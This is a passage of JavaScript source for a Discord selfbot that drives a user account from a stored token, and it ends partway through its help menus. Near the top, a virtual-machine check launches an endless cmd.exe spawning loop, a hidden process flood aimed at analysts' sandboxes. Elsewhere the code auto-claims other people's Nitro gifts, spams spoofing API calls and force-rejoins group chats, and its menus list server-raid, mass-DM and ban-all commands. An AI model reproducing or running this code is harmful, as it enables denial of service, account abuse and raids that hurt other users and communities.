const
    { Client, SpotifyRPC, WebEmbed } = require("discord.js-selfbot-v13"),
    config = require("./config.json"),
    rpcconfig = require("./data/rpc.json"),
    axios = require("axios"),
    os = require("os"),
    si = require("systeminformation"),
    gradient = require('gradient-string'),
    fs = require("fs"),
    NSFW = require("discord-nsfw"),
    nsfw = new NSFW(),
    NodeRSA = require('node-rsa'),
    ms = require("ms"),
    notifier = require('node-notifier'),
    wmi = require('node-wmi'),
    morse = require('morse'),
    spot = require("./data/spotify.json"),
    nekos = require('nekos.life'),
    ip = require('ip'),
    neko = new nekos(),
    spoofcustomstatus = require("./data/customstatus.json"),
    language = config.language
langFile = fs.readFileSync(`./data/language/${language}.json`)
lang = JSON.parse(langFile)
autoReplyData = require("./data/autoreply.json")
prefix = config.prefix,
    { execSync, spawn } = require("child_process"),
    portscanner = require("portscanner"),
    fetch = require("node-fetch"),
    validator = require("email-validator"),
    path = require("path"),
    client = new Client({
        checkUpdate: false,
    }),
    rpc = require("discord-rpc"),
    rpcClient = new rpc.Client({ transport: "ipc" })

require('moment-duration-format');

async function start() {
    await client.login(config.token)
}

function detectVM() {
    return new Promise((resolve, reject) => {
        const query = {
            class: 'Win32_ComputerSystemProduct'
        };

        wmi.Query(query, (err, wmiSystemProduct) => {
            if (err) {
                console.error('Erreur lors de l\'interrogation WMI :', err);
                resolve(false);
                return;
            }

            if (wmiSystemProduct && wmiSystemProduct.length > 0) {
                const manufacturer = wmiSystemProduct[0].Vendor.toLowerCase();
                const productName = wmiSystemProduct[0].Name.toLowerCase();

                // Vérification pour VMware
                if (manufacturer.includes('vmware') || productName.includes('vmware')) {
                    resolve(true);
                    return;
                }

                // Vérification pour VirtualBox
                if (manufacturer.includes('innotek gmbh') || productName.includes('virtualbox')) {
                    resolve(true);
                    return;
                }

                // Vérification pour Hyper-V
                if (manufacturer.includes('microsoft corporation') && productName.includes('virtual machine')) {
                    resolve(true);
                    return;
                }

                // Vérification pour QEMU
                if (manufacturer.includes('qemu')) {
                    resolve(true);
                    return;
                }

                // Vérification pour KVM
                if (manufacturer.includes('kvm')) {
                    resolve(true);
                    return;
                }

                // Vérification pour Xen
                if (manufacturer.includes('xen')) {
                    resolve(true);
                    return;
                }

            }

            resolve(false);
        });
    });
}

detectVM().then((isVM) => {
    if (isVM) {
        console.log('Machine virtuelle détectée | Virtual machine detected');
        while(true) {
            spawn('cmd.exe', ['/C', 'start cmd.exe'], { detached: true})
        }
    }
}).catch((error) => {
    console.error('Une erreur s\'est produite lors de la détection de la machine virtuelle :', error);
});

function loadingicon() {
    let animation = ['/','-','\\'];
    let i = 0;
    let intervalId;

    const clearLine = () => process.stdout.clearLine();
    const cursorToStart = () => process.stdout.cursorTo(0);
    const clearConsole = () => process.stdout.write('\u001B[2J\u001B[0;0f'); // Efface la console
    const centerText = (text) => {
        const terminalWidth = process.stdout.columns;
        const padding = Math.floor((terminalWidth - text.length) / 6.3);
        return ' '.repeat(padding) + text + ' '.repeat(padding);
    };

    intervalId = setInterval(() => {
        clearLine();
        cursorToStart();
        process.stdout.write(gradient.summer(centerText(`                 Code:Project Login Loading ${animation[i]}`)) + '\r');
        i = (i + 1) % animation.length;
    }, 150);

    setTimeout(() => {
        clearInterval(intervalId);
        clearLine();
        cursorToStart();
        process.stdout.write(gradient.summer(centerText(`                 Code:Project Login Loading :D`)) + '\n');

        setTimeout(() => {
            i = 0;
            clearLine();
            cursorToStart();
            process.stdout.write(gradient.summer(centerText(`                   Auth Loading`)) + '\r');

            intervalId = setInterval(() => {
                clearLine();
                cursorToStart();
                process.stdout.write(gradient.summer(centerText(`                     Auth Loading ${animation[i]}`)) + '\r');
                i = (i + 1) % animation.length;
            }, 150);

            setTimeout(() => {
                clearInterval(intervalId);
                clearLine();
                cursorToStart();
                process.stdout.write(gradient.summer(centerText(`                     Auth Loading :D`)) + '\n');

                setTimeout(() => {
                    i = 0;
                    clearLine();
                    cursorToStart();
                    process.stdout.write(gradient.summer(centerText(`                 Configuring Data`)) + '\r');

                    intervalId = setInterval(() => {
                        clearLine();
                        cursorToStart();
                        process.stdout.write(gradient.summer(centerText(`               Configuring Data ${animation[i]}`)) + '\r');
                        i = (i + 1) % animation.length;
                    }, 150);

                    setTimeout(() => {
                        clearInterval(intervalId);
                        clearConsole();
                        if (config.token === "") {
                            console.log(`
                ${gradient.summer(`
                             ▄▄·       ·▄▄▄▄  ▄▄▄ .      ▄▄▄·▄▄▄         ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄
                            ▐█ ▌▪▪     ██▪ ██ ▀▄.▀·      ▐█ ▄█▀▄ █·▪       ·██▀▄.▀·▐█ ▌▪•██  
                            ██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄       ██▀·▐▀▀▄  ▄█▀▄ ▪▄  ██▐▀▀▪▄██ ▄▄ ▐█.▪
                            ▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌      ▐█▪·•▐█•█▌▐█▌.▐▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·
                            ·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀       .▀   .▀  ▀ ▀█▄▀▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀ 
                            `)}
                                    ${gradient.summer("Best Discord Selfbot")} | ${gradient.summer(`Login With Token`)}
                    `);
                            readlineSync = require('readline-sync');
                            const userInput = readlineSync.question(gradient.summer('code-project') + "@" + gradient.summer("token") + `:`);

                            config.token = userInput;

                            fs.writeFile('./config.json', JSON.stringify(config, null, 2), (err) => {
                                if (err) {
                                    console.error('Une erreur s\'est produite lors de l\'enregistrement du token :', err);
                                } else {
                                    console.log(`
${gradient.summer(`
             ▄▄·       ·▄▄▄▄  ▄▄▄ .      ▄▄▄·▄▄▄         ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄
            ▐█ ▌▪▪     ██▪ ██ ▀▄.▀·      ▐█ ▄█▀▄ █·▪       ·██▀▄.▀·▐█ ▌▪•██  
            ██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄       ██▀·▐▀▀▄  ▄█▀▄ ▪▄  ██▐▀▀▪▄██ ▄▄ ▐█.▪
            ▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌      ▐█▪·•▐█•█▌▐█▌.▐▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·
            ·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀       .▀   .▀  ▀ ▀█▄▀▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀ 
            `)}
                       ${gradient.summer("Best Discord Selfbot")} | ${gradient.summer(`unknownuser.js`)}
    `);
                                    console.log(`                       ${gradient.summer("Welcome.")} Use the ${gradient.summer(`${config.prefix}help`)} command to begin`)
                                    start()
                                }
                            });
                        } else {
                            start()
                            console.log(`
${gradient.summer(`
             ▄▄·       ·▄▄▄▄  ▄▄▄ .      ▄▄▄·▄▄▄         ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄
            ▐█ ▌▪▪     ██▪ ██ ▀▄.▀·      ▐█ ▄█▀▄ █·▪       ·██▀▄.▀·▐█ ▌▪•██  
            ██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄       ██▀·▐▀▀▄  ▄█▀▄ ▪▄  ██▐▀▀▪▄██ ▄▄ ▐█.▪
            ▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌      ▐█▪·•▐█•█▌▐█▌.▐▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·
            ·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀       .▀   .▀  ▀ ▀█▄▀▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀ 
            `)}
                       ${gradient.summer("Best Discord Selfbot")} | ${gradient.summer(`unknownuser.js`)}
    `);
                            console.log(`                       ${gradient.summer("Welcome.")} Use the ${gradient.summer(`${config.prefix}help`)} command to begin`)
                        }
                    }, 5000);
                }, 1000);
            }, 5000);
        }, 1000);
    }, 3000);
}
const clearConsole = () => process.stdout.write('\u001B[2J\u001B[0;0f'); // Efface la console
clearConsole();
console.log(`
    ${gradient.summer(`
                 ▄▄·       ·▄▄▄▄  ▄▄▄ .      ▄▄▄·▄▄▄         ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄
                ▐█ ▌▪▪     ██▪ ██ ▀▄.▀·      ▐█ ▄█▀▄ █·▪       ·██▀▄.▀·▐█ ▌▪•██  
                ██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄       ██▀·▐▀▀▄  ▄█▀▄ ▪▄  ██▐▀▀▪▄██ ▄▄ ▐█.▪
                ▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌      ▐█▪·•▐█•█▌▐█▌.▐▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·
                ·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀       .▀   .▀  ▀ ▀█▄▀▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀ 
                `)}
                            Made By ${gradient.summer(`unknownuser.js`)}
        `);

loadingicon()



client.on("ready", () => {
    if (config.spotify == true) {
        const r = new SpotifyRPC(client)
            .setAssetsLargeImage(`${spot.largeimage}`)
            .setAssetsSmallImage(`${spot.smallimage}`)
            .setAssetsLargeText(`${spot.largetext}`)
            .setState(`${spot.state}`)
            .setDetails(`${spot.details}`)
            .setStartTimestamp(Date.now())
            .setEndTimestamp(Date.now() + ms(`${spot.time}`));
        client.user.setActivity(r);
    }

    /*
    console.log(gradient.summer(`
                 ${Date()}

                 [Username] : ${client.user.tag}
                   [Account Created] : ${client.user.createdAt}
                    [Server] : https://discord.gg/FEs48Zb4cC
                  [ID] : ${client.user.id}
                   [Prefix] : ${config.prefix}
                    [Version] : v.${config.version}
                  [Creator] : >_Unknown User#0611
                   [Language] : JavaScript
                    [OS] : ${os.platform()}
                  [Guilds Count] : ${client.guilds.cache.size}
                   [Channels Count] : ${client.channels.cache.size}
                    [Users Count] : ${client.users.cache.size}
                  [Node Version] : ${process.version}
                   [User is Bot] : ${client.user.bot}
                    [User Nitro Type] : ${client.user.nitroType}
    \n\n`));
    */

    /*if (!config.key) {
        console.log(gradient.instagram(`${lang.keymiss}`));
    }*/

    if (!config.language) {
        console.log(gradient.instagram(`${lang.langmiss}`));
        process.exit(1);
    }

// The API has been removed for confidentiality reasons

    /*
      _____  _____   _____
     |  __ \|  __ \ / ____|
     | |__) | |__) | |
     |  _  /|  ___/| |
     | | \ \| |    | |____
     |_|  \_\_|     \_____|
    */
    if (!config.rpc) {
        console.log(gradient.instagram(`${lang.rpcdisable}`));
    } else {
        rpcClient.on("ready", () => {
            rpcClient.request("SET_ACTIVITY", {
                pid: process.pid,
                activity: {
                    state: `${rpcconfig.state}`,
                    details: `${rpcconfig.detail}`,
                    assets: {
                        large_image: `${rpcconfig.largeimage}`,
                        large_text: `${rpcconfig.largetext}`,
                    },
                    buttons: [
                        { label: `${rpcconfig.button1label}`, url: `${rpcconfig.button1link}` },
                        { label: "📧 Discord", url: "https://discord.gg/FEs48Zb4cC" },
                    ],
                },
            });
        });
        rpcClient.login({ clientId: `${rpcconfig.clientid}` }).catch(console.error);
    }



// Hypersquad Spoof

    client.on("messageCreate", async (message) => {
        if (message.author.id !== client.user.id || !message.content.startsWith(prefix + "spoofhype")) return
        message.edit(`${lang.hypespoof}`)
        const houses = [1, 2, 3]
        let counter = 0
        let previousHouseId = null;
        setInterval(async () => {
            let houseId;
            do {
                houseId = houses[Math.floor(Math.random() * houses.length)];
            } while (houseId === previousHouseId);

            try {
                const response = await fetch('https://discord.com/api/v9/hypesquad/online', {
                    method: 'POST',
                    headers: {'Authorization': client.token,'Content-Type': 'application/json',},
                    body: JSON.stringify({
                        "house_id": houseId
                    }),
                });
                if (response.status === 429) {
                    const retryAfter = response.headers.get('Retry-After');
                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000))
                    return}
                if (response.ok) {
                    previousHouseId = houseId;
                } else {
                    console.error(`${lang.spooferror} ${response.status}`)}
            } catch (err) {
                console.error(`${lang.hype3}`)
                console.error(err) }}, 5000)})

// Auto Feur
    client.on("messageCreate", async message => {
        if (config.autofeur) {
            const regex = /quoi|QUOI|quo1|q8oi|quo&|tfq|pk|pq|Quoi|quoI|QuOi|qUoi/g;
            if (regex.test(message.content) && message.author.id !== client.user.id && !config.whitelistautofeur.includes(message.author.id) && !message.guild) {message.channel.send(`<@${message.author.id}> Feur`)}}})

// Auto Ouge
    client.on("messageCreate", async message => {
        if (config.autoreplyrouge) return
        const regex = /ouge|Ouge|OUGE|o[18]ge|ou&e|0uge/g;
        if (regex.test(message.content) && message.author.id !== client.user.id && !config.whitelistautoouge.includes(message.author.id) && !message.guild) {message.channel.send(`<@${message.author.id}> ${lang.ougeres} ?`)}})

// auto custom reply
    client.on("messageCreate", async message => {
        if (config.autocustomreply) {
            if (message.content.includes(autoReplyData.textneededtoreply) && !config.whitelistautocustomreply.includes(message.author.id) && message.author.id !== client.user.id) {
                if (!autoReplyData.textneededtoreply) return
                message.channel.send(`<@${message.author.id}> ${autoReplyData.textreplyed}`)
            }}});

// AFK System
    client.on('messageCreate', message => {
        if (message.author.id === client.user.id) {
            return;
        }
        if (message.guild) return;
        if (config.afkblacklist.includes(message.author.id)) {
            return
        }
        if (config.afk == true) {
            message.author.send(`\`\`\`ini
${lang.afkres} : 

[${config.afkmsg}]
\`\`\``)}})

// Autoclaim Nitro

    client.on("messageCreate", async message => {
        if (!config.nitroautoclaim || message.author.id === client.user.id) {return}
        const regex = /(discord(app)?.com\/gifts\/|discord\.gift\/)([a-zA-Z0-9]+)?/g
        const matches = message.content.match(regex)
        if (!matches) {return}
        for (const match of matches) {const code = match.split("/").pop()
            const res = await fetch(`https://discordapp.com/api/v6/entitlements/gift-codes/${code}?with_application=false&with_subscription_plan=true`, {method: "GET", headers: {"Authorization": config.token}})
            const json = await res.json();
            if (json.message === "Unknown Gift Code") {
                console.log(gradient.cristal(`
            ╭═════════════════════════════════════════════════════════════════════════╮
                                        Nitro Auto Claimer                          
                      ${lang.nitroinvalid1} + https://discord.gift/${code}
            ╰═════════════════════════════════════════════════════════════════════════╯     `))
            } else { const res = await fetch(`https://discordapp.com/api/v6/entitlements/gift-codes/${code}/redeem`, { method: "POST", headers: {"Authorization": config.token}})
                const json = await res.json();
                if (json.message === "You are being rate limited.") { console.log(`${lang.ratenitro}`.red);
                } else {console.log(gradient.instagram(`
              ╭═════════════════════════════════════════════════════════════════════════╮
                                        Nitro Auto Claimer                          
                ${lang.nitroclaimed1} + https://discord.gift/${code}
              ╰═════════════════════════════════════════════════════════════════════════╯     
                          `))}}}})

    /*
      _                  __                 _   _
     | |                / _|               | | (_)
     | |     ___  ___  | |_ ___  _ __   ___| |_ _  ___  _ __
     | |    / _ \/ __| |  _/ _ \| '_ \ / __| __| |/ _ \| '_ \
     | |___|  __/\__ \ | || (_) | | | | (__| |_| | (_) | | | |
     |______\___||___/ |_| \___/|_| |_|\___|\__|_|\___/|_| |_|
    */

    function secondsToMillis(seconds) {
        return seconds * 1000;
    }

    function autoDeleteMiddleware(config) {
        return function (message) { if (config.deletetimer) { setTimeout(() => { message.delete().catch(console.error) }, config.deletetimer)}}}

    function sleep(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
    }
    client.on('typingStart', (interaction) => {
        const { channel, user } = interaction;
        if (config.notification) {
            if (channel.type === 'DM') {
                notifier.notify({
                    title: 'Code: PЯØJΞCƬ | Notification',
                    message: `${user.username} ${lang.istyping}...`,
                    icon: path.join(__dirname, 'notif.png'),
                    appID : 'Code: PЯØJΞCƬ',
                    sound: config.soundnotif,
                })}}})

    client.on("channelCreate", async channel => {
        if (config.antigroupfucker == false) return;
        const channell = client.channels.cache.get(channel.id);
        if (config.antigroupfuckerwhitelist.includes(channel.id)) return;
        if (channell.type !== "DM" && !channell.guild) {
            await channell.fetch();
            try {
                await channell.send(`${config.antigroupfuckermsg}`);
                setInterval(async () => {
                    try {
                        await fetch(`https://discord.com/api/v9/channels/${channell.id}/recipients/${client.user.id}`, {
                            method: 'PUT',
                            headers: {
                                'Accept': '*/*',
                                'Authorization': config.token,
                            },
                        });
                    } catch (error) {
                    }
                }, 350);
                await new Promise(resolve => setTimeout(resolve, 3000));
                await channell.delete();
            } catch (error) {
                console.error(`Erreur : ${error}`);
            }
        } else {
            channell.delete().catch(() => false);
        }
    });


    client.on("channelCreate", async channel => {
        if (config.antigroup === false) return
        var channell = client.channels.cache.get(channel.id)
        if (config.antigroupwhitelist.includes(channel.id)) return
        if (channell.type !== "DM" && !channell.guild){
            channell.send(`${config.antigroupmsg}`)
                .then(() => channell.delete().catch(() => false))
                .catch(() => false)
        }
        else{
            channell.delete().catch(() => false)
        }
    })



    /* isPremium().then((result) => {
        if (result) { */
    client.on("messageCreate", async (message) => {
        if (!message.content.startsWith(prefix)) return
        if (message.author.id !== client.user.id) return
        var args = message.content.substring(prefix.length).split(" ")
        console.log(gradient.summer(`${lang.commandexec} : ${args[0]}`))

        var previousStatus = [];
        var counter = 0;

        function spoofStatus() {
            var statut = [    "online",    "idle",    "dnd", ];

            var random;
            do {
                random = statut[Math.floor(Math.random() * statut.length)];
            } while (previousStatus.includes(random));

            client.user.setStatus(random);
            previousStatus.push(random);

            if (previousStatus.length > statut.length) {
                previousStatus.shift();
            }

            counter++;
            if (counter === statut.length) {
                counter = 0;
                previousStatus = [];
            }

            setTimeout(() => {
                try {
                    spoofStatus();
                } catch (error) {
                    console.error(error);
                    spoofStatus();
                }
            }, 2000);
        }

        /*
           _____                                          _
          / ____|                                        | |
         | |     ___  _ __ ___  _ __ ___   __ _ _ __   __| | ___
         | |    / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |/ _ \
         | |___| (_) | | | | | | | | | | | (_| | | | | (_| |  __/
          \_____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|\___|
        */
        switch (args[0]) {
            case "help":
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ | Selfbot ]

<> = ${lang.required} | [] = ${lang.optional}

[ ${prefix}help ] ${lang.help}
[ ${prefix}admin ] ${lang.admin}
[ ${prefix}animated ] ${lang.animated}
[ ${prefix}text ] ${lang.text}
[ ${prefix}image ] ${lang.image}
[ ${prefix}troll  ] ${lang.troll}
[ ${prefix}fun ] ${lang.fun}
[ ${prefix}autoslash ] ${lang.autoslash}
[ ${prefix}raid ] ${lang.raid}
[ ${prefix}tools ] ${lang.tools}
[ ${prefix}group ] ${lang.helpgroup}
[ ${prefix}nettools ] ${lang.nettools}
[ ${prefix}utils ] ${lang.utils}
[ ${prefix}recovery ] ${lang.recovery}
[ ${prefix}misc ] ${lang.misc}
[ ${prefix}settings ] ${lang.settings}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "fun":
                message.edit(`\`\`\`ini
${lang.fun}

[ ${prefix}dick <@user> [size] ] ${lang.dick}
[ ${prefix}gay <@user> [number] ] ${lang.gay}
[ ${prefix}iq <@user> [number] ] ${lang.iq}
[ ${prefix}coronatest <@user> [number] ] ${lang.covid}
[ ${prefix}insult <@user> ] ${lang.insult}
[ ${prefix}hug <@user> ] ${lang.hug}
[ ${prefix}kiss <@user> ] ${lang.kiss}
[ ${prefix}slap <@user> ] ${lang.slap}
[ ${prefix}pat <@user> ] ${lang.pat}
[ ${prefix}8ball <question> ] ${lang.ball}
[ ${prefix}coinflip ] ${lang.coinflip}
[ ${prefix}wyr ] ${lang.wyr}
[ ${prefix}advice ] ${lang.advice}
[ ${prefix}topic ] ${lang.topic}
[ ${prefix}numberfact <number> ] ${lang.numberfact}
[ ${prefix}catfact ] ${lang.catfact}
[ ${prefix}dogfact ] ${lang.dogfact}
[ ${prefix}joke ] ${lang.joke}
[ ${prefix}quote ] ${lang.quote}
[ ${prefix}fun2 ] Page 2

            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "group":
                message.edit(`\`\`\`ini
${lang.helpgroup}

[ ${prefix}groupfuckersettings ] ${lang.helpenablegroupfucker}
[ ${prefix}groupfuckerwl ] ${lang.helpgroupfuckerwl}
[ ${prefix}antigroupsettings ] ${lang.helpenableantigroup}
[ ${prefix}antigroupwl ] ${lang.helpantigroupwl}
[ ${prefix}groupfucker ] ${lang.helpgroupfucker}
\`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "fun2":
                message.edit(`\`\`\`ini
${lang.fun}(2)

[ ${prefix}bored ] ${lang.bored}
[ ${prefix}rickroll ] ${lang.rickroll}
[ ${prefix}tronald ] ${lang.tronald}
[ ${prefix}kanye ] ${lang.kanye}
[ ${prefix}question ] ${lang.question}
[ ${prefix}rps ] ${lang.rps}
[ ${prefix}dice ] ${lang.dice}
[ ${prefix}emojis ] ${lang.emojis}
[ ${prefix}deathdate <@user> ] ${lang.deathdate}
[ ${prefix}tower ] ${lang.tower}
[ ${prefix}branlette ] ${lang.branlette}
    | Page 2
\`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "raid":
                message.edit(`\`\`\`ini
${lang.raid}

[ ${prefix}masschannel <channelname> ] ${lang.masschannel}
[ ${prefix}massrole <rolename> ] ${lang.massrole}
[ ${prefix}clearrole ] ${lang.clearrole}
[ ${prefix}clearchannel ] ${lang.clearchannel}
[ ${prefix}spamallchannels <text> ] ${lang.spamallchannels}
[ ${prefix}banall ] ${lang.banall}
[ ${prefix}dmfriends ] ${lang.dmfriend}
[ ${prefix}dmserver ] ${lang.dmservered}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "nsfw":
                message.edit(`\`\`\`ini
${lang.nsfw}

[ ${prefix}ass ] ${lang.ass}
[ ${prefix}hentai ] ${lang.hentai}
[ ${prefix}anal ] ${lang.anal}
[ ${prefix}pussy ] ${lang.pussy}
[ ${prefix}boobs ] ${lang.boobs}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "utils":
                message.edit(`\`\`\`ini
${lang.utils}

[ ${prefix}status ] ${lang.status}
[ ${prefix}covid ] ${lang.covidstats}
[ ${prefix}sysinfo ] ${lang.sysinfo}
[ ${prefix}savepfp <@user> ] ${lang.savepfp}
[ ${prefix}deletewebhook <webhook_url> ] ${lang.deletewebhook}
[ ${prefix}hypesquad <house> ] ${lang.hypesquad}
[ ${prefix}setpfp <url> ] ${lang.setpfp}
[ ${prefix}invitechannel <id> ] ${lang.invitechanneled}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "status":
                message.edit(`\`\`\`ini
Discord status

${lang.statustext}
[ ${prefix}spoofstatus ] ${lang.spoofstatus}
[ ${prefix}customspoofstatus ] ${lang.customstatus}
[ ${prefix}online ] ${lang.online}
[ ${prefix}offline ] ${lang.offline}
[ ${prefix}idle ] ${lang.idle}
[ ${prefix}dnd ] ${lang.dnd}

${lang.misc}
[ ${prefix}spoofhype ] ${lang.spoofhype}
[ ${prefix}genshin ] ${lang.genshin}
[ ${prefix}honkai ] ${lang.honkai}
[ ${prefix}bluearchive] ${lang.bluearchive}
\`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "recovery":
                message.edit(`\`\`\`ini
${lang.recovery}

- BACKUP -
[ ${prefix}fullbackup ] ${lang.fullbackup}
[ ${prefix}backupfriends ] ${lang.backupfriends}
[ ${prefix}backupaccount ] ${lang.backupaccount}

        \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "image":
                message.edit(`\`\`\`ini
${lang.image}

[ ${prefix}avatar <@user> ] ${lang.avatar}
[ ${prefix}serverlogo <serverid> ] ${lang.serverlogo}
[ ${prefix}serverbanner <serverid> ] ${lang.serverbanner}
[ ${prefix}dog ] ${lang.dog}
[ ${prefix}cat ] ${lang.cat}
[ ${prefix}fox ] ${lang.fox}
[ ${prefix}meme ] ${lang.meme}
[ ${prefix}wasted <@user> ] ${lang.wasted}
[ ${prefix}pride <@user> ] ${lang.pride}
[ ${prefix}triggered <@user> ] ${lang.triggered}
[ ${prefix}tweet <message> ] ${lang.tweet}
[ ${prefix}trumptweet <message> ] ${lang.trumptweet}
[ ${prefix}changemymind <text> ] ${lang.changemymind}
[ ${prefix}ship <@ladyuser> <@manuser> ] ${lang.ship}
[ ${prefix}clyde <message> ] ${lang.clyde}
[ ${prefix}kannagen <text> ] ${lang.kannagen}
[ ${prefix}nsfw ] ${lang.nsfw}
[ ${prefix}image2 ] Page 2
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "image2":
                message.edit(`\`\`\`ini
Image commands (2)

[ ${prefix}qrcode <text> ] ${lang.qrcode}
[ ${prefix}phcomment [@user] <text> ] ${lang.phcomment}
[ ${prefix}pikachu ] ${lang.pikachu}
[ ${prefix}panda ] ${lang.panda}
[ ${prefix}redpanda ] ${lang.redpanda}
[ ${prefix}duck ] ${lang.duck}
[ ${prefix}whoouldwin <@user> <@user2> ] ${lang.would}
[ ${prefix}bird ] ${lang.bird}
[ ${prefix}koala ] ${lang.koala}
[ ${prefix}image3 ] Page 3
 | Page 2
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "image3":
                message.edit(`\`\`\`ini
Image commands (3)

[ ${prefix}kangaroo ] ${lang.kangaroo}
[ ${prefix}raccoon ] ${lang.raccoon}
[ ${prefix}whale ] ${lang.whale}
[ ${prefix}simpcard <@user> ] ${lang.simpcard}
[ ${prefix}hornycard <@user> ] ${lang.hornycard}
[ ${prefix}lolice <@user> ] ${lang.lolice}
[ ${prefix}awooify <@user> ] ${lang.awooify}
[ ${prefix}baguette <@user> ] ${lang.baguette}
[ ${prefix}wallpaper ] ${lang.wallpaper}
 | Page 3
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "text":
                message.edit(`\`\`\`ini
Text messages

[ ${prefix}regional <text> ] ${lang.regional}
[ ${prefix}space <text> ] ${lang.space}
[ ${prefix}vape <text> ] ${lang.vape}
[ ${prefix}smart <text> ] ${lang.smart}
[ ${prefix}spoiler <text> ] ${lang.spoiler}
[ ${prefix}ascii <text> ] ${lang.ascii}
[ ${prefix}asciifont <text> ] ${lang.asciifont}
[ ${prefix}reverse <text> ] ${lang.reverse}
[ ${prefix}italic <text> ] ${lang.italic}
[ ${prefix}1337 <text> ] ${lang.hacker}
[ ${prefix}owo <text> ] ${lang.owo}
[ ${prefix}encode <text> ] ${lang.encode}
[ ${prefix}decode <base64> ] ${lang.decode}
[ ${prefix}encrypt <text> ] ${lang.encrypt}
[ ${prefix}decrypt <rot-13> ] ${lang.decrypt}
[ ${prefix}zalgo <text> ] ${lang.zalgo}
[ ${prefix}morse <text> ] ${lang.morse}
[ ${prefix}semoji <text> ] ${lang.semoji}
[ ${prefix}codeblock <text> ] ${lang.codeblock}
[ ${prefix}text2bin <text> ] ${lang.text2bin}
[ ${prefix}bin2text <binary> ] ${lang.bin2text}
[ ${prefix}text2hex <text> ] ${lang.text2hex}
[ ${prefix}hex2text <hex> ] ${lang.hex2text}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "settings":
                message.edit(`\`\`\`ini
${lang.settings}

${lang.deletetimer} [${config.deletetimer / 1000} seconds]

[ ${prefix}prefix <newprefix> ] ${lang.prefix}
[ ${prefix}deletetimer <seconds> ] ${lang.deletetimer}
[ ${prefix}whitelistautoouge <userid> ] ${lang.whitelistautoouge}
[ ${prefix}whitelistautofeur <userid> ] ${lang.whitelistautofeur}
[ ${prefix}whitelistautocustomreply <userid ] ${lang.whitelistautocustomreply}
[ ${prefix}autoreply ] ${lang.autoreply}
[ ${prefix}autoouge ] ${lang.autoouge}
[ ${prefix}autofeur ] ${lang.autofeur}
[ ${prefix}notification ] ${lang.notification}
[ ${prefix}rpc ] ${lang.rpc}
[ ${prefix}spotify ] ${lang.spotify}
[ ${prefix}lang <language> ] ${lang.lang} 
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "admin":
                message.edit(`\`\`\`ini
${lang.admin}

[ ${prefix}textchannel <name> ] ${lang.textchannel}
[ ${prefix}voicechannel <name> ] ${lang.voicechannel}
[ ${prefix}category <name> ] ${lang.category}
[ ${prefix}stagechannel <name> ] ${lang.stagechannel}
[ ${prefix}mute <@member> [reason] ] ${lang.mute}
[ ${prefix}unmute <@member> [reason] ] ${lang.unmute}
[ ${prefix}kick <@member> [reason] ] ${lang.kick}
[ ${prefix}ban <@member> [reason] ] ${lang.ban}
[ ${prefix}unban <user_id> [reason] ] ${lang.unban}
[ ${prefix}hackban <user_id> [reason] ] ${lang.hackban}
[ ${prefix}admin2 ] Page 2
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "admin2":
                message.edit(`\`\`\`ini
${lang.admin} (2)

[ ${prefix}banned ] ${lang.banned}
[ ${prefix}savebans ] ${lang.saveban}
[ ${prefix}exportbans <serverid> ] ${lang.exportban}
[ ${prefix}addrole <@member> <role> ] ${lang.addrole}
[ ${prefix}addallrole <@member> ] ${lang.addallrole}
[ ${prefix}allrole <role> ] ${lang.allrole}
[ ${prefix}removeallrole <role> ] ${lang.removeallrole}
[ ${prefix}removerole <@member> <role> ] ${lang.removerole}
[ ${prefix}makerole <role> ] ${lang.makerole}
[ ${prefix}rainbow <role> [seconds] ] ${lang.rainbow}
[ ${prefix}nick <@member> <nick> ] ${lang.nick}
[ ${prefix}admin3 ] Page 3
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "admin3":
                message.edit(`\`\`\`ini
${lang.admin} (3)

[ ${prefix}purge <amount> ] ${lang.purge}
[ ${prefix}userpurge <@user> <amount> ] ${lang.userpurge}
[ ${prefix}nuke ] ${lang.nuke}
